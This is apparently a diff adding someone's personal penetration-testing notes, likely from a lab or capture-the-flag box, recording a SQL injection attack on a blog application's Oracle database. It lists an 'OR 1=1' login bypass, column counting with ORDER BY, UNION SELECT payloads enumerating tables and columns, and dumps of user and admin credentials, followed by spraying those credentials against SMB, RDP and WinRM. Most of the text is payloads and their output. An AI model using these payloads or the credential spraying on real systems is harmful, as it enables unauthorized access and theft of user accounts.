@@ -1,0 +1,58 @@
+------------------
+NOTES
+------------------
+
+/blog
+
+SQLinjectable to 'OR 1=1 -- -
+login as admin
+
+author tab is injectable again
+
+' UNION SELECT * FROM all_tables --
+	error -> need to find out how many queries to make
+
+' ORDER BY 1-- -> valid
+' ORDER BY 2-- -> valid
+' ORDER BY 3-- -> valid
+' ORDER BY 4-- -> invalid
+
+there are 3 columns
+
+' UNION SELECT 'a', NULL, NULL FROM all_tables --
+	first column is a string
+' UNION SELECT NULL, 'a', NULL FROM all_tables --
+	second column is a string
+' UNION SELECT NULL, NULL, 1 FROM all_tables --
+	third column is an int
+
+' UNION SELECT str, str, int FROM all_tables --
+
+  Blog entry from a with title a from 1
+
+	author title id(?)
+
+' UNION SELECT global_name, 'a', 0 FROM global_name --
+
+will return a variable in the string sections
+
+' UNION SELECT table_name, table_name, 0 FROM all_tables --
+	get table names
+
+' UNION SELECT column_name, column_name, 0 FROM all_tab_columns --
+	get all column names
+
+with all the names of the columns i copied the output to a txt file and manipulated it with vim to be in the format of Table name: <tbl> Column name: <clm>
+grepped that file for "PASSWORD"
+noticed the WEB_USERS and WEB_ADMINS tables
+then grep the file for "WEB_" to see all the interesting tables and columns
+
+' UNION SELECT USER_NAME, PASSWORD, USER_ID FROM WEB_USERS --
+	Username: alice Password: bobismyuncle
+	Username: eric Password: thisismypassword
+
+' UNION SELECT ADMIN_NAME, PASSWORD, ADMIN_ID FROM WEB_ADMINS --
+	 Username: admin Password: d82494f05d6917ba02f7aaa29689ccb444bb73f20380876cb05d1f37537b7892
+
+with the creds i tried to spray against smb, rdp, and winrm, no results :(
+thats bc theres the admin login lololol
